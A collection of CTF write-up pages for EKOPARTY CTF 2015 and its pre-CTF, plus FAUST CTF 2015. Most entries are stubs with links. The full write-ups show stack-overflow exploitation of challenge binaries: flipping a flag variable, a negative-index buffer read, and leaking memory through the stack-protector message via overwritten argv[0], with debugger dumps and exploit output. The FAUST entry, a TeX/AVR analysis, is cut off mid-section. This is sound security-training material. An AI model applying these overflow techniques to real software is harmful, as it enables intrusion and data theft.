*EKO{http://www.desimonehnos.com.ar}*

## Other write-ups and resources

* <https://en.internetwache.org/ekoparty-ctf-2015-writeups-24-10-2015/>
* <https://research.g0blin.co.uk/ekoparty-ctf-2015-writeups/#trv100-blocking-truck>
* [Japanese](http://shiho-elliptic.tumblr.com/post/131769380689/ekoparty-ctf-2015-writeup)
# EKOPARTY CTF 2015: Slogans

**Category:** Trivia
**Points:** 50
**Solves:** 255
**Description:**

> Description: EKO{ekopartyslogan2008_ekopartyslogan2009}


## Write-up

by [heticor915](https://github.com/heticor915)

Reading the complete description and doing a quick search, we can find the next url http://www.kungfoosion.com/2010/05/inventa-el-slogan-de-la-ekoparty.html where they mention a slogan contest.

EKO{vi root y entre_what if r00t was one of us?}

## Other write-ups and resources

* <https://en.internetwache.org/ekoparty-ctf-2015-writeups-24-10-2015/>
* <https://www.youtube.com/watch?v=z8JKtT42NwI>
* <https://research.g0blin.co.uk/ekoparty-ctf-2015-writeups/#trv50-slogans>
# EKOPARTY CTF 2015: Banner

**Category:** Trivia
**Points:** 70
**Solves:** 115
**Description:**

> Find the flag in our stand! (it works too if you are not at ekoparty)


## Write-up

(TODO)

## Other write-ups and resources

* <https://research.g0blin.co.uk/ekoparty-ctf-2015-writeups/#trv70-banner>
# EKOPARTY CTF 2015: Mr Anderson

**Category:** Trivia
**Points:** 80
**Solves:** 92
**Description:**

> What is the favorite music artist of the last hacker serie? (without spaces)


## Write-up

(TODO)

## Other write-ups and resources

* <https://research.g0blin.co.uk/ekoparty-ctf-2015-writeups/#trv80-mr-anderson>
# EKOPARTY CTF 2015: SSL Attack

**Category:** Trivia
**Points:** 90
**Solves:** 232
**Description:**

> Name of one of the SSL attacks presented at ekoparty


## Write-up

(TODO)

## Other write-ups and resources

* <https://en.internetwache.org/ekoparty-ctf-2015-writeups-24-10-2015/>
* <https://research.g0blin.co.uk/ekoparty-ctf-2015-writeups/#trv90-ssl-attack>
* [Japanese](http://shiho-elliptic.tumblr.com/post/131769380689/ekoparty-ctf-2015-writeup)
# EKOPARTY CTF 2015: Custom ACL

**Category:** Web
**Points:** 100
**Solves:** 50
**Description:**

> This admin site is protected with a self-made ACL, find a way to get the acces!
> 
> [http://ctfchallenges.ctf.site:10000/ipfilter/admin.php](http://ctfchallenges.ctf.site:10000/ipfilter/admin.php)
> 
> Hints: There is no need to scan the IP found! please do not abuse it :)


## Write-up

(TODO)

## Other write-ups and resources

* <http://capturetheswag.blogspot.de/2015/10/ekoparty-2015-custom-acl-web-100pt.html>
* <https://research.g0blin.co.uk/ekoparty-ctf-2015-writeups/#web100-custom-acl>
# EKOPARTY CTF 2015: Crazy JSON

**Category:** Web
**Points:** 300
**Solves:** 26
**Description:**

> A not so known language is used to compute the password, reverse it!
>
> [http://ctfchallenges.ctf.site:10000/jzoned/](http://ctfchallenges.ctf.site:10000/jzoned/)


## Write-up

(TODO)

## Other write-ups and resources

* [Japanese](http://shiho-elliptic.tumblr.com/post/131769380689/ekoparty-ctf-2015-writeup)
# EKOPARTY CTF 2015: Rand DOOM

**Category:** Web
**Points:** 400
**Solves:** 33
**Description:**

> Do you think this password recovery is safe?
>
> [http://ctfchallenges.ctf.site:10000/randoom/](http://ctfchallenges.ctf.site:10000/randoom/)


## Write-up

(TODO)

## Other write-ups and resources

* <https://research.g0blin.co.uk/ekoparty-ctf-2015-writeups/#rand-doom>
* <https://0x90r00t.com/fr/2015/10/24/ekoparty-part-2-2015-web400-rand-doom-write-up/>
# EKOPARTY CTF 2015: Pass Check

**Category:** Web
**Points:** 50
**Solves:** 119
**Description:**

> There is something wrong with our pass validation, find it and get the flag.
>
> [http://ctfchallenges.ctf.site:10000/passcheck/](http://ctfchallenges.ctf.site:10000/passcheck/)


## Write-up

(TODO)

## Other write-ups and resources

* <https://en.internetwache.org/ekoparty-ctf-2015-writeups-24-10-2015/>
* <https://research.g0blin.co.uk/ekoparty-ctf-2015-writeups/#web50-pass-check>
# EKOPARTY CTF 2015: SVG Viewer

**Category:** Web
**Points:** 500
**Solves:** 7
**Description:**

> Hackers love SVG, go and upload some of them!
>
> [http://ctfchallenges.ctf.site:10001/svgviewer/](http://ctfchallenges.ctf.site:10001/svgviewer/)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# EKOPARTY PRE-CTF 2015: BASE Unknown

**Category:** Crypto
**Points:** 50
**Solves:** 206
**Description:**

> IVFU662CIFJUKXZTGJPWG2DBNRWH2=== 

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/eko-party-pre-ctf-2015-base-unknown/>
* <https://0x90r00t.com/2015/09/20/ekoparty-pre-ctf-2015-cry25-base-unknown-write-up/>
# EKOPARTY PRE-CTF 2015: Classic crypto

**Category:** Crypto
**Points:** 100
**Solves:** 181
**Description:**

> Your mission is to get the hidden message!

>[crypto50.zip](crypto50.zip)  

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/eko-party-pre-ctf-2015-classic-crypto/>
* <https://0x90r00t.com/2015/09/20/ekoparty-pre-ctf-2015-cry50-classic-crypto-write-up/>
* <https://github.com/ByteBandits/writeups/blob/master/ekoparty-pre-ctf-2015/crypto/classic-crypto/chaitan94/README.md>
# EKOPARTY PRE-CTF 2015: Perfect security

**Category:** Crypto
**Points:** 200
**Solves:** 33
**Description:**

> It is not maybe so perfect.

>> Hints: Use the golden math!

>[crypto200.zip](crypto200.zip)

## Write-up

(TODO)

## Other write-ups and resources

* <https://0x90r00t.com/2015/09/20/ekoparty-pre-ctf-2015-cry200-perfect-security-write-up/>
# EKOPARTY PRE-CTF 2015: RSA 2070

**Category:** Crypto
**Points:** 100
**Solves:** 66
**Description:**

> Recover the private key and the flag.

>> Hints: Check your padding :)

>[crypto100.zip](crypto100.zip)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/eko-party-pre-ctf-2015-rsa-2070/>
* <https://0x90r00t.com/2015/09/20/ekoparty-pre-ctf-2015-cry100-rsa-2070-write-up/>
* <http://evandrix.github.io/blogpost-20150919-ctf-ekoparty-pre/crypto/rsa-2070>
* <https://github.com/ByteBandits/writeups/blob/master/ekoparty-pre-ctf-2015/crypto/rsa-2070/chaitan94/README.md>
# EKOPARTY PRE-CTF 2015: Get the flag

**Category:** Misc
**Points:** 50
**Solves:** 80
**Description:**

> GET all the flags! literally. 

> Hints: Source code anyone? *GET* them all

## Write-up

(TODO)

## Other write-ups and resources

* <https://0x90r00t.com/2015/09/20/ekoparty-pre-ctf-2015-misc50-get-the-flag-write-up/>
* <https://github.com/ByteBandits/writeups/blob/master/ekoparty-pre-ctf-2015/misc/get-the-flag/chaitan94/README.md>
# EKOPARTY PRE-CTF 2015: Password manager

**Category:** Misc
**Points:** 100
**Solves:** 91
**Description:**

> It looks like someone has been using a really bad key!

> Hints: [a-zA-Z0-9]{0,4} 

>[misc100](misc100.zip)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/eko-party-pre-ctf-2015-password-manager/>
* <https://github.com/ByteBandits/writeups/blob/master/ekoparty-pre-ctf-2015/misc/password-manager/chaitan94/README.md>
# EKOPARTY PRE-CTF 2015: Reversing pyschology

**Category:** Misc
**Points:** 200
**Solves:** 40
**Description:**

> Find the secret message!

> Hints: It is not a reversing challenge! 

>[misc200](misc200.zip)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/eko-party-pre-ctf-2015-reversing-psychology/>
# EKOPARTY PRE-CTF 2015: The picture challenge

**Category:** Misc
**Points:** 25
**Solves:** 89
**Description:**

>  Send us a picture of your laptop showing the pre-ctf main site, a paper with your registered team name, the EKOPARTY word, and your favorite drink to ekopics@null-life.com. Please be patient as the process is manual, it will be great to see your drinks!

> Examples:
>> [https://ctf.ekoparty.org/static/img/social_challenge.png](https://ctf.ekoparty.org/static/img/social_challenge.png)
>> [https://instagram.com/p/7g9h0NRo32/](https://instagram.com/p/7g9h0NRo32/)

## Write-up

(TODO)

## Other write-ups and resources

* (TODO)
# EKOPARTY PRE-CTF 2015: Smashing the stack for fun and profit

**Category:** Pwning
**Points:** 200
**Solves:** 37
**Description:**

> nc challs.ctf.site 20002

> Hints: 3k0_p4rty_2015! is not the flag! go deeper.

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/eko-party-pre-ctf-2015-echoes/>
* <https://www.whitehatters.academy/pwn200-ret2libc/>
* <https://www.securifera.com/blog/2015/09/23/ekoparty-pre-ctf-echoes/>
* [Spanish](http://rmolina.co/2015/09/prectf-ekoparty-2015.html)
* <http://daehee87.tistory.com/m/post/516>
# EKOPARTY PRE-CTF 2015: Login!

**Category:** Pwning
**Points:** 50
**Solves:** 97
**Description:**

> Are you admin?

> nc challs.ctf.site 20000

>[pwn50](pwn50.zip)

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <https://ctf-team.vulnhub.com/eko-party-pre-ctf-2015-login/>
* <https://0x90r00t.com/2015/09/20/ekoparty-pre-ctf-2015-pwn50-login-write-up/>
* <https://github.com/dqi/ctf_writeup/blob/master/2015/ekoparty_pre-ctf/pwn/pwn50/README.md>
* <https://research.g0blin.co.uk/ekoparty-pre-ctf-2015-writeup/#pwn50>

### Meta

Keywords:

* Stack Overflow
* Check Evasion

Difficulty: `beginner`

We are given a zip that contains a x86-64bit non-stripped ELF for Linux:

```bash
$ 7z x pwn50.zip -oout

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,1 CPU)

Processing archive: pwn50.zip

Extracting  flag

Everything is Ok

Size:       8971
Compressed: 2970
$ cd out
$ file flag
flag: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=36d90477a8214ae522b46125cf8296e52a3a2d6c, not stripped
```

We have to provide a flag file to run it locally: `echo 'EKO{Back_to_r00000ooooo00000tS}' > flag.txt`.

Running it:

```bash
$ ./flag 
User : username
Password : password
```

We can provide a username and password as input.

Decompiling the binary with `radare2`:

![](./main.png)

The binary does the following:

* Read content of `flag.txt` using `fopen` and `fgets` into the stack at `rbp-0xa0`.
* Store size of username string `0x11` and size of password string `0x10` into stack at `rbp-0xd0` and `rbp-0xbc` for a later `read` call
* `read` username (17 bytes) and password (16 bytes) from stdin
* `strncmp` both username and password using size `6` and `8` with `charly` and `h4ckTH1s`
* `cmp` a certain value (`showflag`) at `ebp-0xa8` with `1` and print the flag, if true.

For a better decompiled output provided by IDA, have a look at [this writeup](https://github.com/dqi/ctf_writeup/blob/master/2015/ekoparty_pre-ctf/pwn/pwn50/README.md).

If we provide just the hardcoded username and password, we get the following:

```bash
$ ./flag 
User : charly
Password : h4ckTH1s
Welcome guest!
```

If we look at the stack at the first `strncmp` after providing username and password, we see the following:

```bash
gdb-peda$ b *0x004008eb
[...]
gdb-peda$ r
[...]
User : charly
Password : h4ckTH1s
[...]
gdb-peda$ x/20wx $rbp-0xd0
0x7fffffffe340: 0x00000011      0x72616863      0x000a796c      0x00000000
0x7fffffffe350: 0x00000000      0x00000010      0x6b633468      0x73314854
0x7fffffffe360: 0x0000000a      0x00000000      0x00000000      0x00000000
0x7fffffffe370: 0x7b4f4b45      0x6b636142      0x5f6f745f      0x30303072
0x7fffffffe380: 0x6f6f3030      0x306f6f6f      0x30303030      0x007d5374
gdb-peda$ x/20wx $rbp-0xa8
0x7fffffffe368: 0x00000000      0x00000000      0x7b4f4b45      0x6b636142
0x7fffffffe378: 0x5f6f745f      0x30303072      0x6f6f3030      0x306f6f6f
0x7fffffffe388: 0x30303030      0x007d5374      0xf63d4e2e      0x00000000
0x7fffffffe398: 0x00400427      0x00000000      0xffffffff      0x00000000
0x7fffffffe3a8: 0xffffe508      0x00007fff      0xf7a251a8      0x00007fff
```

We see that our username size begins at `$rbp-0xd0` (`0x7fffffffe340`), followed by the username at `$rbp-0xcc` (`0x7fffffffe340`).
Right after that, we see our password size at `$rbp-0xbc` (`0x7fffffffe354`), followed by the password at `$rbp-0xb8` (`0x7fffffffe358`).
Finally, we see the `showflag` value at `$rbp-0xa8` (`0x7fffffffe368`).

A good graphical representation of this stack state can be seen [in this writeup](https://0x90r00t.com/2015/09/20/ekoparty-pre-ctf-2015-pwn50-login-write-up/).

It becomes clear what we have to do to overflow the `showflag` value to become `1`:

* Overwrite the password size to a bigger number, so that `read` doesn't stop after reading `0x10` bytes for the password, using the username's last input byte
* Overwrite the `showflag` value using the password input string's 17th, or `0x11`th byte

[This python script](./solve.py) does the job:

```bash
$ python2.7 solve.py
[+] Started program './flag'
User : 
Password : 
[+] Recieving all data: Done (62B)
[*] Program './flag' stopped with exit code 0
Welcome guest!
Your flag is : EKO{Back_to_r00000ooooo00000tS}
```

The flag is `EKO{Back_to_r00000ooooo00000tS}`.

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/eko-party-pre-ctf-2015-login/>
* <https://0x90r00t.com/2015/09/20/ekoparty-pre-ctf-2015-pwn50-login-write-up/>
* <https://github.com/ByteBandits/writeups/blob/master/ekoparty-pre-ctf-2015/pwn/login/sudhackar/README.md>
* <https://github.com/dqi/ctf_writeup/blob/master/2015/ekoparty_pre-ctf/pwn/pwn50/README.md>
* <https://research.g0blin.co.uk/ekoparty-pre-ctf-2015-writeup/#pwn50>
* [Spanish](http://rmolina.co/2015/09/prectf-ekoparty-2015.html)
# EKOPARTY PRE-CTF 2015: PRNG Service

**Category:** Pwning
**Points:** 25
**Solves:** 141
**Description:**

> This is our PRNG service

> running at: nc challs.ctf.site 20003

>[pwn25](pwn25.zip)

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <https://ctf-team.vulnhub.com/eko-party-pre-ctf-2015-prng-service/>
* <https://0x90r00t.com/2015/09/20/ekoparty-pre-ctf-2015-pwn25-prng-service/>
* <https://github.com/ByteBandits/writeups/blob/master/ekoparty-pre-ctf-2015/pwn/prng-service/chaitan94/README.md>

We are given a zip that contains a [single C source code file](./pwn25.c).

We can see the following:

* A call of srandom with a hardcoded seed `1337`
* `ANSWER` from `answer.h` most likely contains the flag string, which is stored in a 128 byte sized buffer called `rnd` at pos `0`
* Starting from base index `64`, some random numbers are generated and stored into the rest of the buffer
* In a while loop, we can specify an index `signed int i` that we can read from the buffer from

The weaknesses of this program are:

* The seed is hardcoded, which means we can predict the pseudorandom numbers generated by srandom
* Since the index `i`, which we control (`scanf`), is `signed` that means we can provide negative numbers. `rnd[-64]` is `rnd[0]`

Using this knowledge, we can extract the flag beginning at `rnd[0]` through [this python script](./solve.py).

To reproduce this program:

* Compile the source code with `gcc -o pwn25 -I. pwn25.c`
* Run the program locally or in a VM (change the host accordingly) with `exec socat TCP-LISTEN:6666,fork,reuseaddr EXEC:./pwn25,echo=0,pty,stderr` - or just use `process()` of `pwntools`.
* Execute `solve.py`, retrieve the flag!

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/eko-party-pre-ctf-2015-prng-service/>
* <https://0x90r00t.com/2015/09/20/ekoparty-pre-ctf-2015-pwn25-prng-service/>
* <https://github.com/ByteBandits/writeups/blob/master/ekoparty-pre-ctf-2015/pwn/prng-service/chaitan94/README.md>
# EKOPARTY PRE-CTF 2015: Smashing the stack for fun and profit

**Category:** Pwning
**Points:** 100
**Solves:** 69
**Description:**

> nc challs.ctf.site 20001 

>[pwn100](pwn100.zip)

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <https://ctf-team.vulnhub.com/eko-party-pre-ctf-2015-smashing-the-stack-for-fun-and-profit/>
* <https://github.com/ByteBandits/writeups/blob/master/ekoparty-pre-ctf-2015/pwn/smashing-the-stack-for-fun-and-profit/sudhackar/README.md>
* <https://github.com/dqi/ctf_writeup/tree/master/2015/ekoparty_pre-ctf/pwn/pwn100>
* <https://www.securifera.com/blog/2015/09/23/ekoparty-pre-ctf-smashing-the-stack-for-fun-and-profit/>

### Meta

Keywords:

* Stack Overflow
* Stack Smashing Protector Memory Leak [Source](http://seclists.org/bugtraq/2010/Apr/243)
* Canary

We are given a x86-64bit non-stripped ELF for Linux, zipped:

```bash
$ file ./xpl
xpl: ELF 64-bit LSB  executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=1856a84cc2663caa91e1511a2f0691652201fb95, not stripped
```

We have to provide a flag file named `flag.txt` in order to run it: `echo "EKO{pwning_stack_protector}" > flag.txt `.

Running it:

```bash
$ ./xpl
Interesting data loaded at 0x7fffd209a1e0
Your username? hello
```

We receive an address and can input a username.

Decompiling main using `radare2`:

![](./main.png)

We can see the following:

* `putenv` sets 'LIBC_FATAL_STDERR_=1'
* The content of `flag.txt` is read with `fgets` into the stack at `rbp-0x110` using size `0x20`
* The pointer to this input buffer is printed to us using `__printf`
* Our username input is read into `rbp-0x90` with size `0x400` using `read` - This causes a stack overflow
* A stack canary check is called at `__stack_chk_fail`

With this in mind, we try to trigger a `SIGSEGV`. Our input has to be at least `0x130` (`sub rsp, 0x130`) plus `0x8` (`push rbp`) bytes long.

We start testing various input lengths in manual binary search to find interesting patterns:

```bash
$ p -c 'print "A"*0x130' | ./xpl
Interesting data loaded at 0x7fff92f891e0
Your username? *** stack smashing detected ***: ./xpl terminated
Aborted (core dumped)

$ p -c 'print "A"*0x200' | ./xpl 
Interesting data loaded at 0x7fff35f3c2b0
Your username? Segmentation fault (core dumped)

$ p -c 'print "A"*0x1b0' | ./xpl 
Interesting data loaded at 0x7fff7061bff0
Your username? Segmentation fault (core dumped)

$ p -c 'print "A"*0x160' | ./xpl 
Interesting data loaded at 0x7fff41fed390
Your username? *** stack smashing detected ***: ./xpl terminated
Aborted (core dumped)

$ p -c 'print "A"*0x180' | ./xpl 
Interesting data loaded at 0x7fffe93c0d40
Your username? Segmentation fault (core dumped)

$ p -c 'print "A"*0x170' | ./xpl 
Interesting data loaded at 0x7fffa9202d80
Your username? *** stack smashing detected ***: ./xpl terminated
Aborted (core dumped)

$ p -c 'print "A"*0x178' | ./xpl 
Interesting data loaded at 0x7fffaf92d6d0
Your username? *** stack smashing detected ***:  terminated
Aborted (core dumped)

$ p -c 'print "A"*0x174' | ./xpl 
Interesting data loaded at 0x7fff524293b0
Your username? *** stack smashing detected ***: ./xpl terminated
Aborted (core dumped)

$ p -c 'print "A"*0x176' | ./xpl 
Interesting data loaded at 0x7fffc44993b0
Your username? *** stack smashing detected ***: ./xpl terminated
Aborted (core dumped)

$ p -c 'print "A"*0x177' | ./xpl 
Interesting data loaded at 0x7fffee2d14f0
Your username? *** stack smashing detected ***: ./xpl terminated
Aborted (core dumped)

$ p -c 'print "A"*0x178' | ./xpl 
Interesting data loaded at 0x7fff2a131a20
Your username? *** stack smashing detected ***:  terminated
Aborted (core dumped)

$ p -c 'print "A"*0x179' | ./xpl 
Interesting data loaded at 0x7fffbe5440d0
Your username? *** stack smashing detected ***:  terminated
Aborted (core dumped)

$ p -c 'print "A"*0x17a' | ./xpl 
Interesting data loaded at 0x7fff9f21abf0
Your username? Segmentation fault (core dumped)
```

We can see that beginning at `0x178`, the stack smashing output does not contain the program name and disappears in it's entirety at `0x17a`.

As it turns out, this stack smashing detection technique (known as [Fortify](https://securityblog.redhat.com/2014/03/26/fortify-and-you/)) can be exploited.

As [this writeup](https://github.com/ByteBandits/writeups/blob/master/ekoparty-pre-ctf-2015/pwn/smashing-the-stack-for-fun-and-profit/sudhackar/README.md) hints, [this bugtraq](http://seclists.org/bugtraq/2010/Apr/243) shows that by overwriting argv[0] (which is the program name and used by fortify in the error message) wiht a known pointer to interesting memory data, it will print out this otherwise secret memory data instead of the program name.

[This python script]() tries various offsets for the argv[0] address until finding the correct one at offset `0x176` == `376`:

```bash
$ p solve.py 
[+] Started program './xpl'
[*] Leaked Buffer Addr: 0x7fff8774bc50
[+] Recieving all data: Done (0B)
[*] Program './xpl' stopped with exit code -11
[ 372 ]: 
[+] Started program './xpl'
[*] Leaked Buffer Addr: 0x7fff98b86300
[+] Recieving all data: Done (0B)
[*] Program './xpl' stopped with exit code -11
[ 373 ]: 
[+] Started program './xpl'
[*] Leaked Buffer Addr: 0x7fffabd54120
[+] Recieving all data: Done (0B)
[*] Program './xpl' stopped with exit code -11
[ 374 ]: 
[+] Started program './xpl'
[*] Leaked Buffer Addr: 0x7fffd6f46f40
[+] Recieving all data: Done (0B)
[*] Program './xpl' stopped with exit code -11
[ 375 ]: 
[+] Started program './xpl'
[*] Leaked Buffer Addr: 0x7fff5a11db40
[+] Recieving all data: Done (73B)
[*] Program './xpl' stopped with exit code -6
[ 376 ]: *** stack smashing detected ***: EKO{pwning_stack_protector}
 terminated
```

The flag is `EKO{pwning_stack_protector}`.

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/eko-party-pre-ctf-2015-smashing-the-stack-for-fun-and-profit/>
* <https://github.com/ByteBandits/writeups/blob/master/ekoparty-pre-ctf-2015/pwn/smashing-the-stack-for-fun-and-profit/sudhackar/README.md>
* <https://github.com/dqi/ctf_writeup/tree/master/2015/ekoparty_pre-ctf/pwn/pwn100>
* <https://www.securifera.com/blog/2015/09/23/ekoparty-pre-ctf-smashing-the-stack-for-fun-and-profit/>
* [Spanish](http://rmolina.co/2015/09/prectf-ekoparty-2015.html)
# EKOPARTY PRE-CTF 2015

* <http://ctf.ekoparty.org>
* [Scoreboard](http://ctf.ekoparty.org/scoreboard) or [local alternative](scoreboard)

## Completed write-ups

* [pwn/login](pwn/login)
* [pwn/prng-service](pwn/prng-service)
* [pwn/smashing-the-stack-for-fun-and-profit](pwn/smashing-the-stack-for-fun-and-profit)

## External write-ups only

* [crypto/base-unknown](crypto/base-unknown)
* [crypto/classic-crypto](crypto/classic-crypto)
* [crypto/perfect-security](crypto/perfect-security)
* [crypto/rsa-2070](crypto/rsa-2070)
* [misc/get-the-flag](misc/get-the-flag)
* [misc/password-manager](misc/password-manager)
* [misc/reversing-psychology](misc/reversing-psychology)
* [misc/the-picture-challenge](misc/the-picture-challenge)
* [pwn/echoes](pwn/echoes)
* [rev/decode-it](rev/decode-it)
* [rev/ekogift](rev/ekogift)
* [rev/mov](rev/mov)
* [rev/reversing-the-apc-cache](rev/reversing-the-apc-cache)
* [web/flag-requester](web/flag-requester)
* [web/hackers-market](web/hackers-market)
* [web/protocols](web/protocols)
* [web/safebox](web/safebox)

## Missing write-ups# EKOPARTY PRE-CTF 2015: Decode it

**Category:** Reversing
**Points:** 50
**Solves:** 65
**Description:**

> A not so known decoding algorithm. 

> Hints: Do not trust symbols! they are lying. Check the algorithm. 

> [reversing50.zip](reversing50.zip)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/eko-party-pre-ctf-2015-decode-it/>
* <https://0x90r00t.com/2015/09/20/ekoparty-pre-ctf-2015-rev50-decode-it-write-up/>
# EKOPARTY PRE-CTF 2015: EKOGIFT

**Category:** Reversing
**Points:** 25
**Solves:** 159
**Description:**

> The easiest reversing challenge! 

> [reversing25.zip](reversing25.zip)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/eko-party-pre-ctf-2015-ekogift/>
* <https://github.com/ByteBandits/writeups/blob/master/ekoparty-pre-ctf-2015/rev/ekogift/sudhackar/README.md>
# EKOPARTY PRE-CTF 2015: MOV

**Category:** Reversing
**Points:** 100
**Solves:** 66
**Description:**

> Find the flag through the obscure code 

> [reversing100.zip](reversing100.zip)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/eko-party-pre-ctf-2015-mov/>
* <https://0x90r00t.com/2015/09/20/ekoparty-pre-ctf-2015-rev100-mov-write-up/>
# EKOPARTY PRE-CTF 2015: Reversing the APC cache

**Category:** Reversing
**Points:** 200
**Solves:** 27
**Description:**

> Strings are not always an alternative.

> Hints : APC 3.1.13 with PHP 5.4 was used.

> [reversing200.zip](reversing200.zip)

## Write-up

(TODO)

## Other write-ups and resources

* <http://www.tasteless.eu/post/2015/09/EKOParty-PreCTF-Reversing-APC/>
* <https://0x90r00t.com/2015/09/20/ekoparty-pre-ctf-2015-rev200-reversing-the-apc-cache-write-up/>
# EKOPARTY PRE-CTF 2015: Flag requester

**Category:** Web
**Points:** 25
**Solves:** 151
**Description:**

> Go and get your flag!

> [http://challs.ctf.site:10000/flagrequest/](http://challs.ctf.site:10000/flagrequest/)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/eko-party-pre-ctf-2015-flag-requester/>
* <https://0x90r00t.com/2015/09/20/ekoparty-pre-ctf-2015-web25-flag-requester-write-up/>
# EKOPARTY PRE-CTF 2015: Hacker's Market

**Category:** Web
**Points:** 50
**Solves:** 122
**Description:**

> Hacker's market site is not ready but you can send us some comments!

> [http://challs.ctf.site:10000/hackersmarket/](http://challs.ctf.site:10000/hackersmarket/)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/eko-party-pre-ctf-2015-hackers-market/>
# EKOPARTY PRE-CTF 2015: Protocols

**Category:** Web
**Points:** 100
**Solves:** 68
**Description:**

> Hack the intranet! [http://challs.ctf.site:10002](http://challs.ctf.site:10002)

## Write-up

(TODO)

## Other write-ups and resources

* https://0x90r00t.com/2015/09/20/ekoparty-pre-ctf-2015-web100-protocols-write-up/
# EKOPARTY PRE-CTF 2015: SAFEBOX

**Category:** Web
**Points:** 200
**Solves:** 40
**Description:**

> We have developed a secure system that will allow you to store any secret on the cloud and protect it from prying eyes. We are the only SNOWDEN(R) approved service in the world! You can reach it at [http://challs.ctf.site:10000/safebox/](http://challs.ctf.site:10000/safebox/)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/eko-party-pre-ctf-2015-safebox/>
* <https://0x90r00t.com/2015/09/20/ekoparty-pre-ctf-2015-web200-safebox-write-up/>
# FAUST CTF 2015: bashing

**Category:** Bashing
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# FAUST CTF 2015: faust-quiz

**Category:** Faust-Quiz
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# FAUST CTF 2015: faust2048

**Category:** Faust2048
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# FAUST CTF 2015: goethe-gallery

**Category:** Goethe-Gallery
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# FAUST CTF 2015: notekeeping

**Category:** Notekeeping
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# FAUST CTF 2015 write-ups

* <https://www.faustctf.net/>
* [Scoreboard](https://www.faustctf.net/competition/scoreboard/) or [local alternative](./scorebaord)

## Completed write-ups

* [sell-your-soul](sell-your-soul)

## External write-ups only

* none yet

## Missing write-ups

* [bashing](bashing)
* [faust-quiz](faust-quiz)
* [faust2048](faust2048)
* [goethe-gallery](goethe-gallery)
* [notekeeping](notekeeping)
* [wichteln](wichteln)
# FAUST CTF 2015: sell-your-soul

**Category:** Sell-Your-Soul
**Points:** 
**Solves:** 
**Description:**



## Write-up

by [fluxchief](https://github.com/fluxchief)

The first step was obviously figuring out, what was going on, so we had two POIs, the jobserver and the buildroot.tar.

### Jobserver
The jobserver is some self-decrypting python file, it basically executes an embedded .pyc file. The 'hard' part here was to decompile the pyc file as it was written in python3 and the header was unknown to the py3 decompilers. After some patching and modifying the decompiler, we got most of the original python file.
The script received incoming connections, generates a deterministic hash (the one shown in the webinterface) and added the jobs to a queue. Each job had a 120s delay before starting.

Upon running the job, the jobserver will unpack buildroot.tar to a temporary directory, drop *all* flags + the hash and run make in the directory.


### Buildroot.tar
There is a Makefile, one 64bit c++-ELF (transform) and a pdf directory with a lot of .tex and one avr .hex program. After having a brief look at the ELF we simply skipped it as it seems that it just appends some information to the pdf, so we digged deeper in the tex-files.

The pdf folder contains a couple of `avr.*.tex` files, one `main.tex` and a `checker.c.hex` - It emulates a avr-binary using [avremu](https://gitlab.brokenpipe.de/stettberger/avremu/tree/master) in order to generate the pdf.
The binary loaded one flag via UDR (Serial communication), calculated a hash and then wrote the output to UDR again - looks familar. If we have a look at the `pdf/main.tex`, the remaining part becomes obvious:

	Your Hash:
	\makeatletter
	\newread\myread
	\def\readchallenge#1{%
	    \endlinechar=-1
	    \openin\myread=#1
	    \readline\myread to \challenge%
	    \closein\myread
	}
	\def\process#1{%
	    \endlinechar=-1
	    \openin\myread=#1
	    \@whilesw\unless\ifeof\myread\fi{%
	        \readline\myread to \dataline%
		    \ifdefempty{\dataline}{}{
	            \xdef\avrUDRin{\dataline}
	            \avrloadihex{checker.c.hex}
	            \avrrun
	        	\typeout{Challenge: '\challenge' Hash: '\avrUDR' Flag: \dataline'}
	        	\csxdef{flag@\avrUDR}{\dataline}
	        	\avrreset
		   }
	    }%
	    \closein\myread
	}%
	\makeatother

	\readchallenge{challenge}
	\process{flags}
	\csuse{flag@\challenge}

It reads the challenge + all flags and runs the emulator for each flag.
The application then generates a hash and stores it in `\avrUDR` and defines `flag@\avrUDR` = `\flag`. At the end, it prints the variable `flag@\challenge`, which contains the hash calculated by the buildserver. So the theory is it only prints the flag where the hash matches, so where is the bug?

### The "bug"
In `avr.instr.txt` are a couple of instructions defined, one of them is `\avrreset`:

	\newcommand{\avrreset}{%
	  \avr@keyboard@plugoff
	  \pdfannot
	  {
	    /Subtype /Text
	    /Contents (Resetted)
	    /MyVar AVR-Reset-done\avr@keyboard@plugin
	    }%
	 }

